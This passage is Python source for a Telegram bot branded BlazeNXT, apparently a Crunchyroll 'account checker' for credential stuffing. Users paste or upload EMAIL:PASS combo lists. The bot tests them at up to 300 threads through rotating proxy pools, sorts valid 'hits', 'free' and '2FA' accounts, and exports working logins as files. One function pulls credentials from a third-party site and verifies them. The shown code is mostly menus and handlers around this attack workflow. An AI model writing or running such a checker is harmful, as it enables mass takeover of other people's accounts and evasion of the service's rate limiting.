        f"👋 Hey <b>{esc(name)}</b>! <code>{uid}</code>\n"
        f"{access_line}\n"
        "┌─ <b>STATS</b> ────────────────┐\n"
        f"│ 🌐 Proxies: <code>{proxy_count()} live</code> • 📦 Pool: <code>{pool_size()}</code>\n"
        f"│ 👥 Users: <code>{STORE.active_user_count() if STORE else 0}</code> • 🧵 Threads: <code>{THREADS}</code> (max 300)\n"
        f"│ ⏱ Uptime: <code>{uptime()}</code> • ✅ Checks: <code>{CHECKS_DONE}</code>\n"
        "└────────────────────────┘\n"
        "👇 <i>Choose an action — buttons below</i> 👇"
    )

# ===================== BUTTON MENUS (Bot API 9.4 colored JSON) =====================
# style: "primary" (blue) | "success" (green) | "danger" (red)
# icon_custom_emoji_id: colored custom-emoji icon on the button
# If Telegram rejects either field, we auto-fall back (icons off, then styles off,
# then plain buttons) so the menu can NEVER break.
CUSTOM_EMOJI_ID = "5319302927281177662"  # official Bot API docs example (green check)
_CAPS = {"icon": None, "style": None}  # None = untested, False = rejected, True = ok
# ────────────────── Premium Emoji (BlazeNXT — ULTRA LEGENDRY) ──────────────────
# All unicode emojis are replaced with premium custom-emoji IDs from @fStikBot / @TgEmojis
# Provided by user: ~600 IDs. Mapping below covers every emoji used in BlazeNXT.
# Button icons use icon_custom_emoji_id, message emojis use  tags.
PREMIUM_EMOJI = {}  # removed — single checker plain

def _premium_wrap(text: str) -> str:
    return text
def _premium_wrap_disabled(text: str) -> str:
    return text

def _premium_icon(label: str) -> str | None:
    """Pick best premium icon ID for a button label (first emoji found)."""
    for uni in sorted(PREMIUM_EMOJI, key=len, reverse=True):
        if uni in label:
            return PREMIUM_EMOJI[uni]
    return None

# BlazeNXT ribbon brand
BLAZENXT_RIBBON = ""
BLAZENXT_BRAND = "<b>BlazeNXT</b>"

def _build_kb(rows) -> InlineKeyboardMarkup:
    """rows: list of rows; each row = list of (label, cb) or (label, cb, style)."""
    use_style = _CAPS["style"] is not False
    data = []
    for row in rows or []:
        line = []
        for item in row:
            if not item:
                continue
            label = item[0]
            cb = item[1] if len(item) > 1 else None
            style = item[2] if len(item) > 2 else None
            kwargs = {}
            if style and use_style and style in ("primary","success","danger"):
                kwargs["style"] = style
            line.append(InlineKeyboardButton(label, callback_data=cb, **kwargs))
        if line:
            data.append(line)
    return InlineKeyboardMarkup(data)

async def _send_menu(msg, text: str, rows, edit: bool) -> bool:
    """Send/edit a message with a button menu. Graceful degradation of 9.4 fields."""
    text = text
    for _attempt in range(4):
        use_icon = _CAPS["icon"] is not False
        use_style = _CAPS["style"] is not False
        kb = _build_kb(rows)
        try:
            if edit:
                await msg.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            else:
                await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
            if use_icon:
                _CAPS["icon"] = True
            if use_style:
                _CAPS["style"] = True
            return True
        except BadRequest as e:
            s = str(e).lower()
            if "message is not modified" in s:
                return True
            if use_icon and ("emoji" in s or "icon" in s):
                _CAPS["icon"] = False
                continue
            if use_style and "style" in s:
                _CAPS["style"] = False
                continue
            logger.warning("menu send failed: %s", e)
            return False
    return False

async def reply_menu(msg, text, rows):
    return await _send_menu(msg, text, rows, edit=False)

async def edit_menu(msg, text, rows):
    return await _send_menu(msg, text, rows, edit=True)

# ===================== REPLY KEYBOARD COMPLETELY REMOVED =====================
# No board at all — inline only. Old board removed via ReplyKeyboardRemove.
def _build_reply_kb(rows, resize=True, one_time=False):
    return None
def main_reply_kb(is_owner: bool):
    return None
def owner_reply_kb():
    return None
def gen_reply_kb():
    return None
REPLY_TEXT_MAP = {}

async def _send_reply_menu(msg, text: str, reply_kb, inline_rows=None):
    # removed — inline only
    return False
async def _edit_or_send_reply(msg, text: str, reply_kb):
    return False

PENDING: Dict[int, dict] = {}
PENDING_LOCK = threading.Lock()

def set_pending(uid: int, kind: str, **kw):
    with PENDING_LOCK:
        PENDING[uid] = {"kind": kind, **kw}

def get_pending(uid: int):
    with PENDING_LOCK:
        return PENDING.get(uid)

def clear_pending(uid: int):
    with PENDING_LOCK:
        PENDING.pop(uid, None)

def _has_access(uid: int) -> bool:
    # FREE MODE — no subscription, everyone has access
    return True

def _is_owner(uid: int, username: str = None) -> bool:
    return is_admin(uid, username)

# ===================== MENU DEFINITIONS — BlazeNXT =====================
# Clean Crunchyroll-only menu (no AIO grid) — BlazeNXT
# Keep AIO_SERVICES definition for backward compat but not used in crunchy_only mode
AIO_SERVICES = [
    [("🍥 CRUNCHYROLL", "check", "success")],
]

def menu_main(uid: int):
    # JUST CHECKER — minimal 2x2 + Proxy Settings
    try:
        header = welcome_premium_text(uid, str(uid))
    except Exception:
        header = "╭────────────────────────╮\n│  🔥 <b>BlazeNXT</b> — <i>CRUNCHYROLL</i> 🔥  │\n╰────────────────────────╯"
    rows = [
        [("💎 Check Account", "check", "success"), ("📂 Check File", "file", "primary")],
        [("📖 How To Use", "help", "primary"), ("📊 Bot Stats", "status", "primary")],
        [("⚙️ Proxy Settings", "proxysettings", "primary")],
    ]
    return header, rows

def menu_owner():
    # JUST CHECKER — Proxy Settings only
    header = (
        "⚙️ <b>Proxy Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 Status: <code>{'ON' if proxy_count() else 'OFF'}</code> • 📦 Loaded: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n"
        f"🧵 Threads: <code>{THREADS}</code> (max 300) • ⚙️ Auto: <code>ON</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Format: <code>user:pass@ip:port</code> or <code>ip:port</code>"
    )
    rows = [
        [("❌ Disable Proxies", "disableproxies", "danger"), ("📥 Upload Proxies", "addpx", "success")],
        [("🧹 Clear Proxies", "clearpool", "danger"), ("🧵 Set Threads", "setthreads", "primary")],
        [("⬅️ Back", "menu", "danger")],
    ]
    return header, rows

# ===================== TV / OXAAM WORKERS =====================
def _tv_do(email, pw, code):
    j, st = app_login(email, pw)
    if not j:
        return False, f"login_failed ({st})"
    return activate_tv(j["access_token"], code)

def _oxaam_do():
    # Use proxy for oxaam fetch as well (helps on Railway)
    proxy = get_random_proxy() if "get_random_proxy" in globals() else None
    email, pw = oxaam_fetch(proxy)
    # Fallback: try without proxy if first failed
    if (not email or not pw) and proxy:
        logger.info("Oxaam retry without proxy")
        email, pw = oxaam_fetch(None)
    if not email or not pw:
        return None, None, None
    # Verify the credential via checker (use random proxy for check)
    try:
        r = check_credential({"type": "email", "value": email, "password": pw}, get_random_proxy())
    except Exception as e:
        r = {"st": "err", "data": {"info": str(e)}}
    return email, pw, r

def _oxaam_report(email, pw, res) -> str:
    head = f"🔐 <code>{esc(email)}:{esc(pw)}</code>\n\n"
    if res and res.get("st") == "hit":
        return head + hit_card({"cred": {"type": "email", "value": email, "password": pw},
                                "data": res["data"]})
    st = (res or {}).get("st", "err") if res else "no_cred"
    info = (res or {}).get("data", {}).get("info", "") if res else "oxaam_empty"
    # More user-friendly error
    if st == "no_cred" or not email:
        return (
            "❌ <b>Oxaam Fetch Failed</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "⚠️ Could not extract from Oxaam.\n"
            "• Site may be slow or blocked — try again in 30s\n"
            "• Try <b>📡 Refresh Proxies</b> then retry\n"
            "• Or use <b>💎 Check Account</b> with your own combos\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔍 Debug: <code>{esc(info) or 'no_html'}</code>\n"
            "🔥 <b>BlazeNXT</b> 🎀"
        )
    return head + f"⚠️ Extracted, but check result: <code>{esc(st)}</code> {esc(info)}\n🔥 <b>BlazeNXT</b> 🎀"

# ===================== HIT CARDS (flood-safe) =====================
async def send_hit_cards(msg, entries: List[dict], cap: int = MAX_HIT_CARDS) -> int:
    sent = 0
    for e in entries[:cap]:
        card = hit_card(e)
        for _ in range(2):
            try:
                await msg.reply_text(card, parse_mode=ParseMode.HTML)
                sent += 1
                await asyncio.sleep(0.4)
                break
            except RetryAfter as fw:  # flood control
                ra = fw.retry_after
                ra = ra.total_seconds() if hasattr(ra, "total_seconds") else float(ra)
                await asyncio.sleep(ra + 0.3)
            except Exception:
                return sent
    return sent

# ===================== CHECK RUNNER — BlazeNXT PREMIUM =====================
async def _run_and_report(msg, uid: int, text: str):
    line_count = max(1, text.count("\n") + 1)
    creds_preview = len(extract_credentials(text))
    # Premium initial card — mimics BlazeNXT "CRUNCHYROLL Scan — Live 0.6%"
    init_card = (
        f"╭────────────────────────╮\n"
        f"│ 📈 <b>CRUNCHYROLL — LIVE</b> │\n"
        f"╰────────────────────────╯\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📄 Lines: <code>{line_count}</code> • 🎯 Combos: <code>{creds_preview}</code>\n"
        f"⏳ Crunchyroll 0% [░░░░░░░░░░░░░░░░░░░░] (0/{creds_preview})\n"
        f"⭐ Hits: <code>0</code> | 🆓 Free: <code>0</code> | 🔐 2FA: <code>0</code> | ❌ Bad: <code>0</code> | ⚠️ Errors: <code>0</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📈 <code>0 cpm</code>  🕒 <code>0m 0s</code>  ⏳ ETA <code>—</code>\n"
        f"📡 <b>Live feed:</b> • <i>starting…</i>"
    )
    note = await msg.reply_text(init_card, parse_mode=ParseMode.HTML)
    loop = asyncio.get_running_loop()
    reporter = ProgressReporter(note, loop)
    # Immediate hit sender
    sent_hits = []
    def _hit_cb(entry):
        try:
            sent_hits.append(entry)
            # Send hit card immediately without waiting
            fut = asyncio.run_coroutine_threadsafe(send_hit_cards(msg, [entry], cap=1), loop)
            # Don't wait, just fire
        except Exception:
            pass

    # Dual proxy: auto-fetch + manual pool both active
    try:
        ensure_proxies()
    except Exception:
        pass
    async def _proxy_watchdog():
        while True:
            await asyncio.sleep(60)
            try:
                if proxy_count() < 10:
                    await asyncio.to_thread(refresh_live_proxies, True)
                if pool_size() > 0 and proxy_count() < 5:
                    _load_pool_into_live()
            except Exception:
                pass
            if note.text and "SCAN COMPLETE" in note.text:
                break
        return
    wd_task = asyncio.create_task(_proxy_watchdog())
    try:
        results = await asyncio.to_thread(run_check, text, reporter, _hit_cb)
    except Exception as e:
        await note.edit_text(f"❌ <b>Check error</b>\n━━━━━━━━━━━━━━━━━━━━━\n<code>{esc(str(e)[:120])}</code>",
                             parse_mode=ParseMode.HTML)
        return
    try:
        wd_task.cancel()
    except Exception:
        pass
    bump_checks(results["processed"])
    await note.edit_text(summary_text(results), parse_mode=ParseMode.HTML)

    # exports (sent before the cards so the conversation stays readable)
    premium_only = STORE.get_premium_only(uid)
    to_send = results["hits"] if premium_only else results["hits"] + results["free"]
    if to_send:
        txt_path = make_export(to_send, "txt")
        json_path = make_export(to_send, "json")
        try:
            with open(txt_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.txt"),
                                         caption=f"💎 Accounts: {len(to_send)}")
            with open(json_path, "rb") as f:
                await msg.reply_document(document=InputFile(f, filename="accounts.json"),
                                         caption="📁 JSON export")
        finally:
            Path(txt_path).unlink(missing_ok=True)
            Path(json_path).unlink(missing_ok=True)

    # ⭐ one detail card per hit (flood-safe, capped)
    if results["hits"]:
        sent = await send_hit_cards(msg, results["hits"])
        extra = len(results["hits"]) - sent
        tail = f"\n<i>…+{extra} more in the export file</i>" if extra > 0 else ""
        rows = [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                [("⬅️ Main Menu", "menu", "danger")]]
        await reply_menu(msg, f"📬 <b>Hit cards sent:</b> {sent} {tail}", rows)
    else:
        await reply_menu(msg, "😕 No hits this time.",
                         [[("🔁 Check Again", "check", "success"), ("📂 Check File", "file", "primary")],
                          [("⬅️ Main Menu", "menu", "danger")]])

# ===================== HANDLERS (100% button flow) =====================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    uid = user.id
    name = getattr(user, "first_name", None) or getattr(user, "username", None) or str(uid)
    # Single path — no double message, board completely removed
    try:
        text = welcome_premium_text(uid, name)
        is_owner = is_admin(uid, getattr(user, "username", None))
        if is_owner:
            text = "👑 <b>Welcome Owner!</b>\n" + "━━━━━━━━━━━━━━━━━━━━━\n" + text
    except Exception as e:
        logger.warning("welcome failed %s", e)
        text, _ = menu_main(uid)
        if is_admin(uid, getattr(user, "username", None)):
            text = "👑 <b>Welcome Owner!</b>\n\n" + text
    _, rows = menu_main(uid)
    # Remove reply keyboard completely — single visible message
    try:
        tmp = await msg.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=ReplyKeyboardRemove())
        try:
            await tmp.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=_build_kb(rows))
        except Exception:
            pass
        return
    except Exception as e:
        logger.warning("cmd_start send failed %s", e)
        try:
            await reply_menu(msg, text, rows)
        except Exception:
            pass
        return

async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Catch-all for any typed /command -> steer the user to the buttons."""
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    text, rows = menu_main(user.id)
    await reply_menu(msg, "🔘 This bot is 100% button-driven — pick an option below 👇\n\n" + text, rows)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global THREADS
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg or not msg.text:
        return
    uid = user.id
    text = msg.text.strip()
    # Compat: if user still has old reply board cached, map its text to inline actions (single message)
    _compat_map = {
        "💎 Check Account": "check", "📂 Check File": "file",
        "📖 How To Use": "help", "📊 Bot Stats": "status",
        "⚙️ Proxy Settings": "proxysettings", "👑 Tools Panel": "proxysettings",
        "👑 Owner Panel": "proxysettings", "⬅️ Main Menu": "menu", "⬅️ Back": "proxysettings",
        "🔁 Check Again": "check",
    }
    compat_action = _compat_map.get(text)
    if compat_action:
        clear_pending(uid)
        if compat_action == "menu":
            t2, rows2 = menu_main(uid)
            await reply_menu(msg, t2, rows2)
            return
        elif compat_action == "check":
            set_pending(uid, "creds")
            await reply_menu(msg, "💎 <b>Check Account</b>\n\nSend <code>EMAIL:PASS</code> — one or many lines.\nExample: <code>user@gmail.com:pass123</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        elif compat_action == "file":
            await reply_menu(msg, "📂 <b>Check File</b>\n\nSend me your <code>.txt</code> / <code>.csv</code> file with combos.", [[("⬅️ Back", "menu", "danger")]])
            return
        elif compat_action == "help":
            await reply_menu(msg, help_text(), [[("⬅️ Back", "menu", "danger")]])
            return
        elif compat_action == "status":
            await reply_menu(msg, status_text(), [[("⬅️ Back", "menu", "danger")]])
            return
        elif compat_action == "proxysettings":
            ptext, rows = menu_owner()
            await reply_menu(msg, ptext, rows)
            return
    pending = get_pending(uid)

    # ---------- active input flows ----------
    if pending:
        kind = pending["kind"]

        if kind == "creds":
            clear_pending(uid)
            creds = extract_credentials(text)
            if not creds:
                await reply_menu(msg,
                    "❌ No credentials found.\nFormat: <code>EMAIL:PASS</code>",
                    [[("🔁 Try Again", "check", "success"), ("⬅️ Menu", "menu", "danger")]])
                return
            if len(creds) > MAX_PASTED_CREDS:
                await reply_menu(msg,
                    f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file instead.",
                    [[("📂 Check File", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
                return
            await _run_and_report(msg, uid, text)
            return

        if kind == "addpx":
            clear_pending(uid)
            lines = [l for l in text.splitlines() if l.strip()]
            if not lines:
                return
            if len(lines) > MAX_PASTED_PROXIES:
                await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_PROXIES}).",
                                 [[("📥 Try Again", "addpx", "primary"),
                                   ("⬅️ Back", "proxysettings", "danger")]])
                return
            ac = bool(STORE.get_setting("auto_check", True))
            added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
            status = "🔎 Auto-check in background..." if ac else "Added."
            await reply_menu(
                msg,
                f"📥 <b>Proxies Added</b>\n\n➕ <code>{added}</code> | ⚠️ <code>{invalid}</code> | Pool: <code>{pool_size()}</code>\n\n{status}",
                [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "proxysettings", "danger")]],
            )
            return

        if kind in ("tv_email", "tv_code"):
            clear_pending(uid)
            await reply_menu(msg, "ℹ️ TV removed — just a checker now.", [[("⬅️ Menu", "menu", "danger")]])
            return

        clear_pending(uid)

    # plain credential paste without button
    creds = extract_credentials(text)
    if creds:
        if len(creds) > MAX_PASTED_CREDS:
            await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file.", [[("📂 Check File", "file", "primary")]])
            return
        await _run_and_report(msg, uid, text)
        return
    # if not creds and not pending, show menu only if user seems lost — but avoid double message on every random text
    if text.startswith("/"):
        mtext, rows = menu_main(uid)
        await reply_menu(msg, "🔘 Use buttons 👇\n\n" + mtext, rows)
        return
    # otherwise ignore free text to avoid spamming double messages
    return

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg or not msg.document:
        return
    uid = user.id
    pending = get_pending(uid)

    # Handle proxy file upload when in addpx state
    if pending and pending.get("kind") == "addpx":
        clear_pending(uid)
        doc = msg.document
        name = (doc.file_name or "unknown.txt").lower()
        if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
            await reply_menu(msg, f"❌ File too large (max <code>{MAX_FILE_MB} MB</code>).",
                             [[("📥 Try Again", "addpx", "primary"), ("⬅️ Menu", "menu", "danger")]])
            return
        note = await msg.reply_text("📥 Downloading proxy file...")
        try:
            tg_file = await context.bot.get_file(doc.file_id)
            tmp_path = Path(tempfile.gettempdir()) / f"proxy_{uid}_{int(time.time())}.txt"
            await tg_file.download_to_drive(str(tmp_path))
            text = tmp_path.read_text(encoding="utf-8", errors="ignore")
            tmp_path.unlink(missing_ok=True)
        except Exception as e:
            await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>", parse_mode=ParseMode.HTML)
            return
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not lines:
            await note.edit_text("❌ No proxies found in file.", parse_mode=ParseMode.HTML)
            return
        if len(lines) > MAX_PASTED_PROXIES:
            await note.edit_text(f"❌ Too many lines (max {MAX_PASTED_PROXIES}).", parse_mode=ParseMode.HTML)
            return
        ac = bool(STORE.get_setting("auto_check", True))
        await note.edit_text(f"🔍 Testing <code>{len(lines)}</code> proxies... (auto-check {'ON' if ac else 'OFF'})", parse_mode=ParseMode.HTML)
        added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
        status = "🔍 Auto-check started..." if ac else "Added (live check skipped)."
        await note.edit_text(
            f"📥 <b>Proxies Uploaded</b>\n\n✅ Added: <code>{added}</code> • ⚠️ Invalid: <code>{invalid}</code>\n"
            f"📦 Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>\n\n{status}",
            parse_mode=ParseMode.HTML
        )
        await reply_menu(msg, f"✅ Proxies ready! Pool: <code>{pool_size()}</code> • Live: <code>{proxy_count()}</code>",
                         [[("🧪 Test Proxies", "proxysettings", "success"), ("💎 Check Account", "check", "success")], [("⬅️ Menu", "menu", "danger")]])
        return

    # Fix: file check should work even if pending is creds/addpx etc — clear and allow
    if pending and pending["kind"] != "file":
        # Don't block file upload — just clear stale pending (e.g., creds from previous Check Account)
        clear_pending(uid)
        pending = None
    if pending:
        clear_pending(uid)
    if not _has_access(uid):
        text, rows = menu_main(uid)
        await reply_menu(msg, text, rows)
        return

    doc = msg.document
    name = (doc.file_name or "unknown.txt").lower()
    if not name.endswith((".txt", ".log", ".json", ".csv")):
        await reply_menu(msg, "❌ Only <code>.txt / .log / .json / .csv</code> files allowed.",
                         [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
        return
    if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
        await reply_menu(msg, f"❌ File too large (max <code>{MAX_FILE_MB} MB</code>).",
                         [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]])
        return

    note = await msg.reply_text("📥 Downloading file...")
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        tmp_path = Path(tempfile.gettempdir()) / f"crunchy_{uid}_{int(time.time())}.txt"
        await tg_file.download_to_drive(str(tmp_path))
        text = tmp_path.read_text(encoding="utf-8", errors="ignore")
        tmp_path.unlink(missing_ok=True)
    except Exception as e:
        await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>",
                             parse_mode=ParseMode.HTML)
        return
    if not text.strip():
        await note.edit_text("❌ File is empty.")
        return
    await _run_and_report(msg, uid, text)

async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global THREADS
    q = update.callback_query
    if not q:
        return
    user = q.from_user
    uid = user.id if user else 0
    data = q.data or ""
    m = q.message
    await q.answer()

    if data == "menu":
        text, rows = menu_main(uid)
        await edit_menu(m, text, rows)
        return
    elif data == "help":
        await edit_menu(m, help_text(), [[("⬅️ Back", "menu", "danger")]])
        return
    elif data == "check":
        set_pending(uid, "creds")
        await edit_menu(m, "💎 <b>Check Account</b>\n\nSend <code>EMAIL:PASS</code> — one or many lines.\nExample: <code>user@gmail.com:pass123</code>", [[("⬅️ Back", "menu", "danger")]])
        return
    elif data == "file":
        clear_pending(uid)
        set_pending(uid, "file")
        await edit_menu(m, "📂 <b>Check File</b>\n\nSend me your file.", [[("⬅️ Back", "menu", "danger")]])
        return
    elif data == "status":
        await edit_menu(m, status_text(), [[("⬅️ Back", "menu", "danger")]])
        return
    elif data == "proxysettings":
        ac = bool(STORE.get_setting("auto_check", True))
        status = "🟢 ON" if proxy_count() > 0 else "🔴 OFF"
        loaded = pool_size()
        live = proxy_count()
        text = (
            "🔵 <b>Proxy Settings</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🟢 Status: <b>{status}</b>\n"
            f"📦 Loaded: <code>{loaded}</code> • 🌐 Live: <code>{live}</code>\n"
            f"🧵 Threads: <code>{THREADS}</code> (max 300)\n"
            f"⚙️ Auto-Check: <code>{'ON' if ac else 'OFF'}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Format: <code>user:pass@ip:port</code> or <code>ip:port</code>"
        )
        await edit_menu(m, text,
                        [[("🔵 Disable Proxies", "disableproxies", "primary"), ("📤 Upload Proxies", "addpx", "success")],
                         [("🧵 Set Threads", "setthreads", "primary"), ("🧹 Clear Proxies", "clearpool", "danger")],
                         [("⬅️ Back", "menu", "danger")]])
        return
    elif data == "opanel":
        text, rows = menu_owner()
        await edit_menu(m, text, rows)
        return
    elif data == "pool":
        await edit_menu(m, "ℹ️ Use <b>⚙️ Proxy Settings</b>.", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
        return
    elif data == "addpx":
        set_pending(uid, "addpx")
        await edit_menu(m, "📥 <b>Upload Proxies</b>\n\nPaste lines (one per line):\n<code>host:port</code> or <code>user:pass@ip:port</code>", [[("⬅️ Back", "proxysettings", "danger")]])
        return
    elif data == "disableproxies":
        with PROXY_LOCK:
            LIVE_PROXIES.clear()
        await edit_menu(m, "🔵 <b>Proxies Disabled</b>\n🌐 Live: <code>0</code> • Pool kept.", [[("📤 Upload Proxies", "addpx", "success"), ("⬅️ Back", "proxysettings", "danger")]])
        return
    elif data == "clearpool":
        await asyncio.to_thread(clear_pool)
        text, rows = menu_owner()
        await edit_menu(m, "🧹 <b>Pool cleared.</b>\n\n" + text, rows)
        return
    elif data == "setthreads":
        await edit_menu(m, f"🧵 <b>Set Threads</b>\nCurrent: <code>{THREADS}</code> • Max 300",
                        [[("🧵 50", "threads_50", "primary"), ("🧵 100", "threads_100", "success")],
                         [("🧵 200", "threads_200", "primary"), ("🧵 300", "threads_300", "success")],
                         [("⬅️ Back", "proxysettings", "danger")]])
        return
    elif data.startswith("threads_"):
        try:
            val = int(data.split("_")[1])
            if 10 <= val <= 300:
                THREADS = val
                try:
                    STORE.set_setting("threads", val)
                except Exception:
                    pass
                await edit_menu(m, f"✅ <b>Threads Set</b>\n🧵 Now: <code>{THREADS}</code> • ~<code>{THREADS*4} cpm</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
                return
        except Exception:
            pass
        await edit_menu(m, "❌ Invalid.", [[("⬅️ Back", "proxysettings", "danger")]])
        return
    elif data in ("genpick", "gen_24", "gen_48", "gen_72", "refresh", "autocheck", "oxaam", "tv"):
        await edit_menu(m, "ℹ️ <b>Just a Checker</b> — that feature was removed.\nUse <b>💎 Check Account</b> / <b>📂 Check File</b>.", [[("⬅️ Back", "menu", "danger")]])
        return


async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Unhandled error: %s", context.error, exc_info=context.error)
    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "❌ Internal error — try again or contact the owner."
            )
    except Exception:
        pass

# ===================== ENTRYPOINT =====================
def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("[!] BOT_TOKEN is not set.  Export BOT_TOKEN=<token from @BotFather>")
        sys.exit(1)
    if not OWNER_ID:
        print("[!] OWNER_ID is not set (or not a number).  Export OWNER_ID=<your Telegram numeric id>")
        sys.exit(1)

    global STORE, THREADS
    STORE = Store(DATA_DIR / "store.json")
    # Load THREADS from store if set via bot
    try:
        saved_threads = STORE.get_setting("threads", None)
        if saved_threads and 10 <= int(saved_threads) <= 300:
            THREADS = int(saved_threads)
            print(f"[*] Loaded THREADS from store: {THREADS}")
    except Exception:
        pass

    print(f"[*] CrunchyrollChecker — BlazeNXT single checker starting")
    print(f"[*] Owner: {OWNER_USERNAME} ({OWNER_ID}) | Threads: {THREADS} | Data dir: {DATA_DIR.resolve()}")

    _load_pool_into_live()
    import threading
    threading.Thread(target=_proxy_loop, daemon=True).start()

    from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(MessageHandler(filters.COMMAND, cmd_any))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_error_handler(on_error)

    print("[+] Bot running. Ctrl+C to stop.")
    print(f"[*] Token: {BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]} len={len(BOT_TOKEN)} | Polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
